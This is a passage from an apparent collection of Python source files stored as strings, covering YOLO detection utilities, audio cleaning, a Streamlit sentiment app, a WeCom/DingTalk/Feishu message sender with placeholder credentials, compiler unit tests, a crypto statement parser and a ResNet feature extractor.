parse_bibtex(response.text)\r\nprint(f\"Total processing time: {time.time() - start_time} seconds\")  # End time of the program\r\n",
    "import numpy as np\nimport torch\nimport torchvision\nimport cv2\nfrom collections import OrderedDict\n\n\ndef letterbox(img, new_shape=(640, 640), color=(114, 114, 114), auto=True, scaleFill=False, scaleup=True, stride=32):\n    # Resize and pad image while meeting stride-multiple constraints\n    shape = img.shape[:2]  # current shape [height, width]\n    if isinstance(new_shape, int):\n        new_shape = (new_shape, new_shape)\n\n    # Scale ratio (new / old)\n    r = min(new_shape[0] / shape[0], new_shape[1] / shape[1])\n    if not scaleup:  # only scale down, do not scale up (for better test mAP)\n        r = min(r, 1.0)\n\n    # Compute padding\n    ratio = r, r  # width, height ratios\n    new_unpad = int(round(shape[1] * r)), int(round(shape[0] * r))\n    dw, dh = new_shape[1] - new_unpad[0], new_shape[0] - new_unpad[1]  # wh padding\n    if auto:  # minimum rectangle\n        dw, dh = np.mod(dw, stride), np.mod(dh, stride)  # wh padding\n    elif scaleFill:  # stretch\n        dw, dh = 0.0, 0.0\n        new_unpad = (new_shape[1], new_shape[0])\n        ratio = new_shape[1] / shape[1], new_shape[0] / shape[0]  # width, height ratios\n\n    dw /= 2  # divide padding into 2 sides\n    dh /= 2\n\n    if shape[::-1] != new_unpad:  # resize\n        img = cv2.resize(img, new_unpad, interpolation=cv2.INTER_LINEAR)\n    top, bottom = int(round(dh - 0.1)), int(round(dh + 0.1))\n    left, right = int(round(dw - 0.1)), int(round(dw + 0.1))\n    img = cv2.copyMakeBorder(img, top, bottom, left, right, cv2.BORDER_CONSTANT, value=color)  # add border\n    return img, ratio, (dw, dh)\n\n\ndef clip_coords(boxes, img_shape):\n    # Clip bounding xyxy bounding boxes to image shape (height, width)\n    boxes[:, 0].clamp_(0, img_shape[1])  # x1\n    boxes[:, 1].clamp_(0, img_shape[0])  # y1\n    boxes[:, 2].clamp_(0, img_shape[1])  # x2\n    boxes[:, 3].clamp_(0, img_shape[0])  # y2\n\n\ndef scale_coords(img1_shape, coords, img0_shape, ratio_pad=None):\n    # Rescale coords (xyxy) from img1_shape to img0_shape\n    if ratio_pad is None:  # calculate from img0_shape\n        gain = min(img1_shape[0] / img0_shape[0], img1_shape[1] / img0_shape[1])  # gain  = old / new\n        pad = (img1_shape[1] - img0_shape[1] * gain) / 2, (img1_shape[0] - img0_shape[0] * gain) / 2  # wh padding\n    else:\n        gain = ratio_pad[0][0]\n        pad = ratio_pad[1]\n\n    coords[:, [0, 2]] -= pad[0]  # x padding\n    coords[:, [1, 3]] -= pad[1]  # y padding\n    coords[:, :4] /= gain\n    clip_coords(coords, img0_shape)\n    return coords\n\n\ndef dist2bbox(distance, anchor_points, xywh=True, dim=-1):\n    \"\"\"Transform distance(ltrb) to box(xywh or xyxy).\"\"\"\n    lt, rb = torch.split(distance, 2, dim)\n    x1y1 = anchor_points - lt\n    x2y2 = anchor_points + rb\n    if xywh:\n        c_xy = (x1y1 + x2y2) / 2\n        wh = x2y2 - x1y1\n        return torch.cat((c_xy, wh), dim)  # xywh bbox\n    return torch.cat((x1y1, x2y2), dim)  # xyxy bbox\n\n\ndef xywh2xyxy(x):\n    # Convert nx4 boxes from [x, y, w, h] to [x1, y1, x2, y2] where xy1=top-left, xy2=bottom-right\n    y = x.clone() if isinstance(x, torch.Tensor) else np.copy(x)\n    y[..., 0] = x[..., 0] - x[..., 2] / 2  # top left x\n    y[..., 1] = x[..., 1] - x[..., 3] / 2  # top left y\n    y[..., 2] = x[..., 0] + x[..., 2] / 2  # bottom right x\n    y[..., 3] = x[..., 1] + x[..., 3] / 2  # bottom right y\n    return y\n\n\ndef box_iou(box1, box2, eps=1e-7):\n    (a1, a2), (b1, b2) = box1.unsqueeze(1).chunk(2, 2), box2.unsqueeze(0).chunk(2, 2)\n    inter = (torch.min(a2, b2) - torch.max(a1, b1)).clamp(0).prod(2)\n\n    return inter / ((a2 - a1).prod(2) + (b2 - b1).prod(2) - inter + eps)\n\n\ndef make_anchors(feats, strides, grid_cell_offset=0.5):\n    \"\"\"Generate anchors from features.\"\"\"\n    anchor_points, stride_tensor = [], []\n    assert feats is not None\n    dtype, device = feats[0].dtype, feats[0].device\n    for i, stride in enumerate(strides):\n        _, _, h, w = feats[i].shape\n        sx = torch.arange(end=w, device=device, dtype=dtype) + grid_cell_offset  # shift x\n        sy = torch.arange(end=h, device=device, dtype=dtype) + grid_cell_offset  # shift y\n        sy, sx = torch.meshgrid(sy, sx)\n        anchor_points.append(torch.stack((sx, sy), -1).view(-1, 2))\n        stride_tensor.append(torch.full((h * w, 1), stride, dtype=dtype, device=device))\n    return torch.cat(anchor_points), torch.cat(stride_tensor)\n\n\ndef non_max_suppression(\n        prediction,\n        conf_thres=0.25,\n        iou_thres=0.45,\n        classes=None,\n        agnostic=False,\n        multi_label=False,\n        labels=(),\n        max_det=300,\n        nm=0,  # number of masks\n):\n    \"\"\"Non-Maximum Suppression (NMS) on inference results to reject overlapping detections\n\n    Returns:\n         list of detections, on (n,6) tensor per image [xyxy, conf, cls]\n    \"\"\"\n\n    if isinstance(prediction, (list, tuple)):  # YOLOv5 model in validation model, output = (inference_out, loss_out)\n        prediction = prediction[0]  # select only inference output\n\n    device = prediction.device\n    mps = 'mps' in",
    "import os\nimport numpy as np\nimport librosa\nimport soundfile as sf\nfrom pydub import AudioSegment\nfrom pydub.silence import split_on_silence\nfrom pydub.playback import play\nfrom tqdm import tqdm\n\ndef clean_audio(audio_path, output_path, selected_chunks, min_silence_len=1000, silence_thresh=-40, keep_silence=100):\n    # Load the audio file\n    audio_segment = AudioSegment.from_file(audio_path)\n\n    # Convert to mono\n    audio_segment = audio_segment.set_channels(1)\n\n    # Normalize the audio\n    audio_segment = normalize_audio(audio_segment)\n\n    # Split on silence\n    chunks = split_on_silence(\n        audio_segment,\n        min_silence_len=min_silence_len,\n        silence_thresh=silence_thresh,\n        keep_silence=keep_silence,\n    )\n\n    # Find the main speaker based on total duration\n    main_speaker_chunk = max(chunks, key=lambda chunk: len(chunk))\n\n    # Apply EQ and compression\n    main_speaker_chunk = apply_eq_and_compression(main_speaker_chunk)\n\n    # Export the main speaker's audio\n    main_speaker_chunk.export(output_path, format=\"wav\")\n\ndef normalize_audio(audio_segment):\n    \"\"\"\n    Normalizes the audio to a target volume.\n    \"\"\"\n    target_dBFS = -20\n    change_in_dBFS = target_dBFS - audio_segment.dBFS\n    return audio_segment.apply_gain(change_in_dBFS)\n\ndef apply_eq_and_compression(audio_segment):\n    \"\"\"\n    Applies equalization and compression to the audio.\n    \"\"\"\n    # Apply EQ\n    audio_segment = audio_segment.high_pass_filter(80)\n    audio_segment = audio_segment.low_pass_filter(12000)\n\n    # Apply compression\n    threshold = -20\n    ratio = 2\n    attack = 10\n    release = 100\n    audio_segment = audio_segment.compress_dynamic_range(\n        threshold=threshold,\n        ratio=ratio,\n        attack=attack,\n        release=release,\n    )\n\n    return audio_segment\n\ndef process_file(wav_file, srt_file, cleaned_folder):\n    print(f\"Processing file: {wav_file}\")\n\n    # Create the cleaned folder if it doesn't exist\n    os.makedirs(cleaned_folder, exist_ok=True)\n\n    input_wav_path = wav_file\n    output_wav_path = os.path.join(cleaned_folder, os.path.basename(wav_file))\n\n    # Review and select desired SRT chunks\n    selected_chunks = review_srt_chunks(input_wav_path, srt_file)\n\n    # Clean the audio based on selected chunks\n    clean_audio(input_wav_path, output_wav_path, selected_chunks)\n\n    print(f\"Cleaned audio saved to: {output_wav_path}\")\n\ndef review_srt_chunks(audio_path, srt_path):\n    audio_segment = AudioSegment.from_wav(audio_path)\n    selected_chunks = []\n\n    with open(srt_path, \"r\") as srt_file:\n        srt_content = srt_file.read()\n        srt_entries = srt_content.strip().split(\"\\n\\n\")\n\n        for entry in tqdm(srt_entries, desc=\"Reviewing SRT chunks\", unit=\"chunk\"):\n            lines = entry.strip().split(\"\\n\")\n            if len(lines) >= 3:\n                start_time, end_time = lines[1].split(\" --> \")\n                start_time = convert_to_milliseconds(start_time)\n                end_time = convert_to_milliseconds(end_time)\n\n                chunk = audio_segment[start_time:end_time]\n                print(\"Playing chunk...\")\n                play(chunk)\n\n                choice = input(\"Keep this chunk? (y/n): \")\n                if choice.lower() == \"y\":\n                    selected_chunks.append((start_time, end_time))\n                    print(\"Chunk selected.\")\n                else:\n                    print(\"Chunk skipped.\")\n\n    return selected_chunks\n\ndef convert_to_milliseconds(time_str):\n    time_str = time_str.replace(\",\", \".\")\n    hours, minutes, seconds = time_str.strip().split(\":\")\n    milliseconds = (int(hours) * 3600 + int(minutes) * 60 + float(seconds)) * 1000\n    return int(milliseconds)\n\n# Set the WAV file, SRT file, and cleaned folder paths\nwav_file = \"/path/to/your/audio.wav\"\nsrt_file = \"/path/to/your/subtitles.srt\"\ncleaned_folder = \"/path/to/cleaned/folder\"\n\n# Process the WAV file\nprocess_file(wav_file, srt_file, cleaned_folder)\n\nprint(\"Processing completed.\")\n",
    "import streamlit as st\r\nimport assemblyai as ai\r\nimport matplotlib.pyplot as plt\r\nfrom wordcloud import WordCloud\r\n\r\nai.settings.api_key = \"API_KEY\"\r\n\r\nst.title(\"Customer Satisfaction from Audio Recording\")\r\n\r\nuploaded_file = st.file_uploader(\"Upload an audio file\", type=[\"mp3\",\"wav\"])\r\n\r\nif uploaded_file is not None:\r\n    audio_url = \"./temp_audio.mp3\" \r\n    with open(audio_url, \"wb\") as f:\r\n        f.write(uploaded_file.read())\r\n\r\n    config = ai.TranscriptionConfig(sentiment_analysis=True, auto_highlights=True)\r\n    transcript = ai.Transcriber().transcribe(audio_url, config)\r\n\r\n    positive_count = 1\r\n    neutral_count = 1\r\n    negative_count = 1\r\n\r\n    positive_score = 0\r\n    neutral_score = 0\r\n    negative_score = 0\r\n\r\n    for sentiment_result in transcript.sentiment_analysis:\r\n        if sentiment_result.sentiment == ai.SentimentType.positive:\r\n            positive_count += 1\r\n            positive_score += sentiment_result.confidence\r\n        elif sentiment_result.sentiment == ai.SentimentType.neutral:\r\n            neutral_count += 1\r\n            neutral_score += sentiment_result.confidence\r\n        else:\r\n            negative_count += 1\r\n            negative_score += sentiment_result.confidence\r\n\r\n    if positive_count > neutral_count and positive_count > negative_count:\r\n        sentiment = \"Positive\"\r\n        resultScore = positive_score / positive_count\r\n    elif negative_count > neutral_count and negative_count > positive_count:\r\n        sentiment = \"Negative\"\r\n        resultScore = negative_score / negative_count\r\n    else:\r\n        sentiment = \"Neutral\"\r\n        resultScore = neutral_score / neutral_count\r\n\r\n    st.subheader(\"Sentiment Analysis:\")\r\n    st.write(f\"Sentiment: {sentiment}\")\r\n    st.write(f\"Confidence Score: {resultScore:.2f}\")\r\n\r\n\r\n    st.subheader(\"Word Cloud of Highlighted Words:\")\r\n    highlights = []\r\n    for result in transcript.auto_highlights.results:\r\n        highlights.append(result.text)\r\n\r\n    highlighted_text = \" \".join(highlights)\r\n    wordcloud = WordCloud(width=800, height=400, background_color='white').generate(highlighted_text)\r\n    plt.figure(figsize=(10, 5))\r\n    plt.imshow(wordcloud, interpolation='bilinear')\r\n    plt.axis(\"off\")\r\n    st.pyplot(plt)\r\n",
    "import json\nimport requests\nimport os\nimport time\nimport io\nfrom PyPDF2 import PdfReader, PdfWriter\n\ntimeout=30\n\ncurrent_dir = os.path.dirname(os.path.abspath(__file__))\nos.chdir(current_dir)\n\nglobal WX_ACCESS_TOKEN\nglobal DD_ACCESS_TOKEN\nglobal FS_ACCESS_TOKEN\n\nwx_touser = '@all' # \u53d1\u9001\u7ed9\u6240\u6709\u4eba\nwx_agentId = 'XXXX'\nwx_secret = 'XXXX'\nwx_companyId = 'XXXX'\n\ndd_appKey = 'XXXX'\ndd_appSecret = 'XXXX'\ndd_robotCode = 'XXXX'\ndd_openConversationId = 'XXXX'\n\nfs_appId = 'XXXX'\nfs_appSecret = 'XXXX'\nfs_openId = 'XXXX'\n\ndef get_wx_token():\n    global WX_ACCESS_TOKEN\n    WX_ACCESS_TOKEN = None\n    if os.path.exists('WX_ACCESS_TOKEN.txt'):\n        txt_last_edit_time = os.stat('WX_ACCESS_TOKEN.txt').st_mtime\n        now_time = time.time()\n        if now_time - txt_last_edit_time < 7000:  # 2\u5c0f\u65f6\u5237\u65b0\n            with open('WX_ACCESS_TOKEN.txt', 'r') as f:\n                WX_ACCESS_TOKEN = f.read()\n    if not WX_ACCESS_TOKEN:\n        try:\n            r = requests.post(\n                f'https://qyapi.weixin.qq.com/cgi-bin/gettoken?corpid={wx_companyId}&corpsecret={wx_secret}', timeout=timeout).json()\n        except Exception as e:\n            print(f\"\u83b7\u53d6\u901a\u884c\u5bc6\u94a5\u65f6\u53d1\u751f\u9519\u8bef: {e}\")\n            return\n        WX_ACCESS_TOKEN = r[\"access_token\"]\n        with open('WX_ACCESS_TOKEN.txt', 'w', encoding='utf-8') as f:\n            f.write(WX_ACCESS_TOKEN)\n\ndef get_dd_token():\n    global DD_ACCESS_TOKEN\n    DD_ACCESS_TOKEN = None\n    if os.path.exists('DD_ACCESS_TOKEN.txt'):\n        txt_last_edit_time = os.stat('DD_ACCESS_TOKEN.txt').st_mtime\n        now_time = time.time()\n        if now_time - txt_last_edit_time < 7000:  # 2\u5c0f\u65f6\u5237\u65b0\n            with open('DD_ACCESS_TOKEN.txt', 'r') as f:\n                DD_ACCESS_TOKEN = f.read()\n    if not DD_ACCESS_TOKEN:\n        try:\n            r = requests.post(\n                f'https://api.dingtalk.com/v1.0/oauth2/accessToken', json={'appKey': dd_appKey, 'appSecret': dd_appSecret}, timeout=timeout).json()\n        except Exception as e:\n            print(f\"\u83b7\u53d6\u901a\u884c\u5bc6\u94a5\u65f6\u53d1\u751f\u9519\u8bef: {e}\")\n            return\n        DD_ACCESS_TOKEN = r[\"accessToken\"]\n        with open('DD_ACCESS_TOKEN.txt', 'w', encoding='utf-8') as f:\n            f.write(DD_ACCESS_TOKEN)\n\ndef get_fs_token():\n    global FS_ACCESS_TOKEN\n    FS_ACCESS_TOKEN = None\n    if os.path.exists('FS_ACCESS_TOKEN.txt'):\n        txt_last_edit_time = os.stat('FS_ACCESS_TOKEN.txt').st_mtime\n        now_time = time.time()\n        if now_time - txt_last_edit_time < 7000:  # 2\u5c0f\u65f6\u5237\u65b0\n            with open('FS_ACCESS_TOKEN.txt', 'r') as f:\n                FS_ACCESS_TOKEN = f.read()\n    if not FS_ACCESS_TOKEN:\n        try:\n            r = requests.post(\n                f'https://open.feishu.cn/open-apis/auth/v3/tenant_access_token/internal', json={'app_id': fs_appId, 'app_secret': fs_appSecret}, timeout=timeout).json()\n        except Exception as e:\n            print(f\"\u83b7\u53d6\u901a\u884c\u5bc6\u94a5\u65f6\u53d1\u751f\u9519\u8bef: {e}\")\n            return\n        FS_ACCESS_TOKEN = r[\"tenant_access_token\"]\n        with open('FS_ACCESS_TOKEN.txt', 'w', encoding='utf-8') as f:\n            f.write(FS_ACCESS_TOKEN)\n\nclass SendManager:\n    def __init__(self,wx=False,dd=False,fs=False) -> None:\n        self.wx=wx\n        self.dd=dd\n        self.fs=fs\n\n    def sendMsg(self,msg):\n        print(msg)\n        if self.wx:\n            get_wx_token()\n            if WX_ACCESS_TOKEN:\n                send_wx_msg(msg_part(msg, 500))\n        if self.dd:\n            get_dd_token()\n            if DD_ACCESS_TOKEN:\n                send_dd_msg(msg_part(msg, 3000))\n        if self.fs:\n            get_fs_token()\n            if FS_ACCESS_TOKEN:\n                send_fs_msg(msg_part(msg, 10000))\n    \n    def sendImage(self,path):\n        if self.wx:\n            get_wx_token()\n            if WX_ACCESS_TOKEN:\n                send_wx_image(upload_wx_file(path))\n        if self.dd:\n            get_dd_token()\n            if DD_ACCESS_TOKEN:\n                send_dd_image(upload_dd_file(path))\n        if self.fs:\n            get_fs_token()\n            if FS_ACCESS_TOKEN:\n                send_fs_image(upload_fs_image(path))\n\n    def sendFile(self,path):\n        if self.wx:\n            get_wx_token()\n            if WX_ACCESS_TOKEN:\n                send_wx_file(upload_wx_file(path))\n        if self.dd:\n            get_dd_token()\n            if DD_ACCESS_TOKEN:\n                send_dd_file(upload_dd_file(path))\n        if self.fs:\n            get_fs_token()\n            if FS_ACCESS_TOKEN:\n                send_fs_file(upload_fs_file(path))\n\ndef get_pdf_size(pdf_writer):\n    temp_io = io.BytesIO()\n    pdf_writer.write(temp_io)\n    return temp_io.getbuffer().nbytes\n\ndef split_pdf(filepath, max_size):\n    if os.path.getsize(filepath) < max_size:\n        return [filepath]\n    pdf = PdfReader(filepath)\n    pdf_writer = PdfWriter()\n    filepaths = []\n    output_filename = f'{filepath[:-4]}_'\n    start_page = 0\n    for page in range(len(pdf.pages)):\n        pdf_writer.add_page(pdf.pages[page])\n        if get_pdf_size(pdf_writer) >= max_size:\n            if start_page != page:\n          ",
    "# Ultralytics YOLO \ud83d\ude80, GPL-3.0 license\n\nimport contextlib\nimport math\nfrom pathlib import Path\nfrom urllib.error import URLError\n\nimport cv2\nimport matplotlib.pyplot as plt\nimport numpy as np\nimport pandas as pd\nimport torch\nfrom PIL import Image, ImageDraw, ImageFont\n\nfrom ultralytics.yolo.utils import FONT, USER_CONFIG_DIR, threaded\n\nfrom .checks import check_font, check_requirements, is_ascii\nfrom .files import increment_path\nfrom .ops import clip_coords, scale_image, xywh2xyxy, xyxy2xywh\n\n\nclass Colors:\n    # Ultralytics color palette https://ultralytics.com/\n    def __init__(self):\n        # hex = matplotlib.colors.TABLEAU_COLORS.values()\n        hexs = ('FF3838', 'FF9D97', 'FF701F', 'FFB21D', 'CFD231', '48F90A', '92CC17', '3DDB86', '1A9334', '00D4BB',\n                '2C99A8', '00C2FF', '344593', '6473FF', '0018EC', '8438FF', '520085', 'CB38FF', 'FF95C8', 'FF37C7')\n        self.palette = [self.hex2rgb(f'#{c}') for c in hexs]\n        self.n = len(self.palette)\n\n    def __call__(self, i, bgr=False):\n        c = self.palette[int(i) % self.n]\n        return (c[2], c[1], c[0]) if bgr else c\n\n    @staticmethod\n    def hex2rgb(h):  # rgb order (PIL)\n        return tuple(int(h[1 + i:1 + i + 2], 16) for i in (0, 2, 4))\n\n\ncolors = Colors()  # create instance for 'from utils.plots import colors'\n\n\nclass Annotator:\n    # YOLOv5 Annotator for train/val mosaics and jpgs and detect/hub inference annotations\n    def __init__(self, im, line_width=None, font_size=None, font='Arial.ttf', pil=False, example='abc'):\n        assert im.data.contiguous, 'Image not contiguous. Apply np.ascontiguousarray(im) to Annotator() input images.'\n        non_ascii = not is_ascii(example)  # non-latin labels, i.e. asian, arabic, cyrillic\n        self.pil = pil or non_ascii\n        if self.pil:  # use PIL\n            self.im = im if isinstance(im, Image.Image) else Image.fromarray(im)\n            self.draw = ImageDraw.Draw(self.im)\n            self.font = check_pil_font(font='Arial.Unicode.ttf' if non_ascii else font,\n                                       size=font_size or max(round(sum(self.im.size) / 2 * 0.035), 12))\n        else:  # use cv2\n            self.im = im\n        self.lw = line_width or max(round(sum(im.shape) / 2 * 0.003), 2)  # line width\n\n    def box_label(self, box, label='', color=(128, 128, 128), txt_color=(255, 255, 255)):\n        # Add one xyxy box to image with label\n        if self.pil or not is_ascii(label):\n            self.draw.rectangle(box, width=self.lw, outline=color)  # box\n            if label:\n                w, h = self.font.getsize(label)  # text width, height\n                outside = box[1] - h >= 0  # label fits outside box\n                self.draw.rectangle(\n                    (box[0], box[1] - h if outside else box[1], box[0] + w + 1,\n                     box[1] + 1 if outside else box[1] + h + 1),\n                    fill=color,\n                )\n                # self.draw.text((box[0], box[1]), label, fill=txt_color, font=self.font, anchor='ls')  # for PIL>8.0\n                self.draw.text((box[0], box[1] - h if outside else box[1]), label, fill=txt_color, font=self.font)\n        else:  # cv2\n            p1, p2 = (int(box[0]), int(box[1])), (int(box[2]), int(box[3]))\n            cv2.rectangle(self.im, p1, p2, color, thickness=self.lw, lineType=cv2.LINE_AA)\n            if label:\n                tf = max(self.lw - 1, 1)  # font thickness\n                w, h = cv2.getTextSize(label, 0, fontScale=self.lw / 3, thickness=tf)[0]  # text width, height\n                outside = p1[1] - h >= 3\n                p2 = p1[0] + w, p1[1] - h - 3 if outside else p1[1] + h + 3\n                cv2.rectangle(self.im, p1, p2, color, -1, cv2.LINE_AA)  # filled\n                cv2.putText(self.im,\n                            label, (p1[0], p1[1] - 2 if outside else p1[1] + h + 2),\n                            0,\n                            self.lw / 3,\n                            txt_color,\n                            thickness=tf,\n                            lineType=cv2.LINE_AA)\n\n    def masks(self, masks, colors, im_gpu, alpha=0.5, retina_masks=False):\n        \"\"\"Plot masks at once.\n        Args:\n            masks (tensor): predicted masks on cuda, shape: [n, h, w]\n            colors (List[List[Int]]): colors for predicted masks, [[r, g, b] * n]\n            im_gpu (tensor): img is in cuda, shape: [3, h, w], range: [0, 1]\n            alpha (float): mask transparency: 0.0 fully transparent, 1.0 opaque\n        \"\"\"\n        if self.pil:\n            # convert to numpy first\n            self.im = np.asarray(self.im).copy()\n        if len(masks) == 0:\n            self.im[:] = im_gpu.permute(1, 2, 0).contiguous().cpu().numpy() * 255\n        colors = torch.tensor(colors, device=im_gpu.device, dtype=torch.float32) / 255.0\n        colors = colors[:, None, None]  # shape(n,1,1,3)\n        masks = masks.unsqueeze(3)  # shape(n,h,w,1)\n        masks_color = masks * (colors * alpha)  # shape(n,h,w,3)\n\n        inv_alph_masks = (1 -",
    "# File: tests/test_10_while.py\n\nfrom unittest import TestCase\nfrom delta import Compiler, SyntaxMistake\nfrom delta.semantics import SemanticMistake\n\n\nclass TestWhile(TestCase):\n\n    def setUp(self):\n        self.c = Compiler('program')\n\n    def test_syntax_mistake(self):\n        with self.assertRaises(SyntaxMistake):\n            self.c.realize('while {}')\n\n    def test_semantic_mistake(self):\n        with self.assertRaises(SemanticMistake):\n            self.c.realize('var while; 0')\n\n    def test_while_zero(self):\n        self.assertEqual(0,\n                         self.c.realize(\n                            '''\n                            var x, y;\n                            x = 0;\n                            y = 0;\n                            while x {\n                                x = x - 1;\n                                y = 1;\n                            }\n                            x + y\n                            '''))\n\n    def test_while_fact(self):\n        self.assertEqual(120,\n                         self.c.realize(\n                            '''\n                            var n, r, i;\n                            n = 5;\n                            r = 1;\n                            i = 0;\n                            while n - i {\n                                i = i + 1;\n                                r = r * i;\n                            }\n                            r\n                            '''))\n\n    def test_while_count_down(self):\n        self.assertEqual(0,\n                         self.c.realize(\n                            '''\n                            var i;\n                            i = 10;\n                            while i {\n                                i = i - 1;\n                            }\n                            i\n                            '''))\n\n    def test_while_skip_body(self):\n        self.assertEqual(10,\n                         self.c.realize(\n                            '''\n                            var n;\n                            n = 10;\n                            while !n {\n                                n = n - 1;\n                            }\n                            n\n                            '''))\n\n    def test_while_fibo(self):\n        self.assertEqual(55,\n                         self.c.realize(\n                            '''\n                            var n, a, b;\n                            n = 10;\n                            a = 0;\n                            b = 1;\n                            while n {\n                                var t;\n                                t = b;\n                                b = a + b;\n                                a = t;\n                                n = n - 1;\n                            }\n                            a\n                            '''))\n\n    def test_while_nested(self):\n        self.assertEqual(1500,\n                         self.c.realize(\n                            '''\n                            var r, i;\n                            r = 0;\n                            i = 10;\n                            while i {\n                                var j;\n                                j = 50;\n                                while j {\n                                    var k;\n                                    k = 3;\n                                    while k {\n                                        r = r + 1;\n                                        k = k - 1;\n                                    }\n                                    j = j - 1;\n                                }\n                                i = i - 1;\n                            }\n                            r\n                            '''))\n",
    "import logging\r\nfrom Defaults import Defaults\r\n\r\n# Class responsible for extracting and\r\n# holding the information of a line from\r\n# an exchange platform CSV statement\r\n\r\n# Possibilities for class members:\r\n# - opType: Buy, Sell, Receive, Withdrawal, Send,\r\n#            Convert, Staking Income, Learning Reward\r\n# - crypto: crypto symbol (BTC, DOGE, etc...)\r\n# spotCurrency: EUR or USD\r\n\r\nclass StatementLine:\r\n\r\n  # Constructor inputs:\r\n  #  - textStatementLine: current line processed\r\n  #  - previousStatementLine: previous StatementLine already analysed\r\n  def __init__(self, textStatementLine, previousStatementLine=None):\r\n    self.textStatementLine = textStatementLine.strip()\r\n    self.previousStatementLine = previousStatementLine\r\n    logging.debug(self.textStatementLine)\r\n\r\n    # Attributes that class will attempt to extract\r\n    self.date = self.opType = self.crypto = None\r\n    self.quantity = self.spotCurrency = None\r\n    self.spotPrice = self.subTotal = None\r\n    self.fees = None\r\n    self.cryptoFees = 0\r\n\r\n    # Will store the subclass type\r\n    self.lineType = None\r\n\r\n    # For debug purposes, will store raw data\r\n    self.rawData = {}\r\n\r\n    # Flag for determining if line is valid\r\n    self.lineFormatValid = False\r\n    self.lineInformationComplete = False\r\n\r\n    # Flag for discarding lines if joined\r\n    #  with another line after analysis\r\n    self.lineWorthSomething = True\r\n    self.discardPreviousLine = False\r\n\r\n    # Immediate call to extract information\r\n    self.extractInformation()\r\n\r\n  # Basic attribute getters\r\n  def isLineFormatValid(self):\r\n    return self.lineFormatValid\r\n  def isLineInformationComplete(self):\r\n    return self.lineInformationComplete\r\n  def isLineWorthSomething(self):\r\n    return self.lineWorthSomething\r\n  def isDiscardPreviousLine(self):\r\n    return self.discardPreviousLine\r\n  def getDate(self):\r\n    return self.date\r\n  def getOpType(self):\r\n    return self.opType\r\n  def getCrypto(self):\r\n    return self.crypto\r\n  def getQuantity(self):\r\n    return self.quantity\r\n  def getSpotCurrency(self):\r\n    return self.spotCurrency\r\n  def getSpotPrice(self):\r\n    return self.spotPrice\r\n  def getSubTotal(self):\r\n    return self.subTotal\r\n  def getFees(self):\r\n    return self.fees\r\n  def getCryptoFees(self):\r\n    return self.cryptoFees\r\n  def getLineOptions(self):\r\n    return self.lineOptions\r\n  def getLineType(self):\r\n    return self.lineType\r\n  def getRawData(self):\r\n    return self.rawData\r\n\r\n  # Basic attribute setters\r\n  def setFees(self, fees):\r\n    self.fees = fees\r\n  def setSubTotal(self, subTotal):\r\n    self.subTotal = subTotal\r\n  def setSpotCurrency(self, spotCurrency):\r\n    self.spotCurrency = spotCurrency\r\n  def setSpotPrice(self, spotPrice):\r\n    self.spotPrice = spotPrice\r\n  def setLineInformationComplete(self, isComplete):\r\n    self.lineInformationComplete = isComplete\r\n  def setLineInformationValid(self, isValid):\r\n    self.lineInformationComplete = isValid\r\n  def setLineWorthSomething(self, isWorth):\r\n    self.lineWorthSomething = isWorth\r\n  def setDiscardPreviousLine(self, discard):\r\n    self.discardPreviousLine = discard\r\n  def setRawData(self, rawData):\r\n    self.rawData = rawData\r\n\r\n  # Role: sets validity flags to all good\r\n  def setEverythingValid(self):\r\n    self.lineFormatValid = True\r\n    self.lineInformationComplete = True\r\n\r\n  # Role: sets validity flags to all bad\r\n  def setNothingValid(self):\r\n    self.lineFormatValid = False\r\n    self.lineInformationComplete = False\r\n\r\n  # Returns:\r\n  #  - true if line is an operation that buys crypto\r\n  #  - false otherwise\r\n  def isBuyLine(self):\r\n    return self.getOpType() == \"Buy\"\r\n\r\n  # Returns:\r\n  #  - true if line is an operation that regards crypto entering the wallet\r\n  #  - false otherwise\r\n  def isInLine(self):\r\n    return self.getOpType() in [\"Buy\", \"Staking Income\", \"Learning Reward\", \"Receive\"]\r\n\r\n  # Returns:\r\n  #  - true if line is an operation that sells crypto\r\n  #  - false otherwise\r\n  def isSellLine(self):\r\n    return self.getOpType() == \"Sell\"\r\n\r\n  # Returns:\r\n  #  - true if line is an operation that regards crypto exiting the wallet\r\n  #  - false otherwise\r\n  def isOutLine(self):\r\n    return self.getOpType() in [\"Sell\", \"Withdraw\", \"Send\"]\r\n\r\n  # Role: perform basic checks for whether a line might be invalid\r\n  def basicLineChecks(self):\r\n    if(not self.textStatementLine or\r\n      self.textStatementLine == \"\"\r\n      or \",\" not in self.textStatementLine):\r\n      self.setNothingValid()\r\n      return False\r\n\r\n  # Role: keeps the raw data from the line in an array\r\n  def setRawData(self, splitData):\r\n    if len(splitData) == len(self.listData):\r\n      for i in range(0,len(splitData)):\r\n        self.rawData[self.listData[i]] = splitData[i]\r\n    else:\r\n      raise IndexError(\"Data not extractable\")\r\n\r\n  # Human readable class functions\r\n  def __str__(self):\r\n    if self.isLineFormatValid():\r\n      return str({\r\n                  'date': self.date.strftime(\"%Y-%m-%d %H:%M:%S\"),\r\n                  'opTy",
    "import torch\nfrom torch import nn\nfrom torchvision import models\n\nclass ResNet(nn.Module):\n    def __init__(self, out_dim, fix_params=False, running_stats=False, pretrained = False):\n        super().__init__()\n        self.out_dim = out_dim\n        self.resnet = models.resnet18(pretrained  = pretrained )\n        if fix_params:\n            for param in self.resnet.parameters():\n                param.requires_grad = False\n\n        self.resnet.fc = nn.Linear(self.resnet.fc.in_features, out_dim)\n        self.bn_stats(running_stats)\n        \n    def forward(self, x):\n        return self.resnet(x)\n\n    def bn_stats(self, track_running_stats):\n        for m in self.modules():\n            if type(m) == nn.BatchNorm2d:\n                m.track_running_stats = track_running_stats\n\nclass FeatureExtractor(nn.Module):\n    def __init__(self):\n        super(FeatureExtractor, self).__init__()\n        self.cnn_fdim = 512 \n        self.cnn = ResNet(self.cnn_fdim, running_stats=False, pretrained=True)\n        # If freeze the CNN params \n        for param in self.cnn.parameters():\n            param.requires_grad = False\n       \n    def to(self, device):\n        self.device = device\n        super().to(device)\n        return self\n    \n    def forward(self, data):\n        # pose: 69 dim body pose\n        batch_size, seq_len, _, _, _ = data['of'].shape # \n\n        of_data = data['of'] # B X T X 224 X 224 X 2 \n        of_data = torch.cat((of_data, torch.zeros(of_data.shape[:-1] + (1,), device=of_data.device)), dim=-1)\n        h, w = 224, 224 \n        c = 3\n        of_data = of_data.reshape(-1, h, w, c).permute(0, 3, 1, 2) # B X T X 3 X 224 X 224 \n        input_features = self.cnn(of_data).reshape(batch_size, seq_len, self.cnn_fdim) # B X T X D \n\n        return input_features \n\nif __name__ == '__main__':\n    net = ResNet(128)\n    input = 